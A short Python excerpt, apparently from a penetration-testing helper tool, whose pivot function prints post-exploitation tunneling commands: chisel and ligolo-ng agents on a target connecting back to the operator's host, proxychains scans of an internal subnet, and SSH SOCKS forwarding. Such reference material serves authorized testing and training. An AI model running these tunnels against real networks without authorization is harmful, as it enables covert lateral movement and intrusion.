...
def pivot() -> None:
    ...
    console.print(f"  [dim]# on you:[/]     [green]chisel server -p 8000 --reverse[/]")
    console.print(f"  [dim]# on target:[/]  [green]chisel client {you}:8000 R:1080:socks[/]")
    console.print(f"  [dim]# then:[/]       [green]proxychains nmap -sT 172.16.0.0/24[/]")
    console.print("\n[bold]ligolo-ng (tun interface, faster):[/]")
    console.print(f"  [dim]# on you:[/]     [green]ligolo-proxy -selfcert -laddr 0.0.0.0:11601[/]")
    console.print(f"  [dim]# on target:[/]  [green]agent -connect {you}:11601 -ignore-cert[/]")
    console.print("\n[bold]SSH (if you have creds):[/]")
    console.print(f"  [green]ssh -D 1080 user@foothold   # dynamic SOCKS[/]")
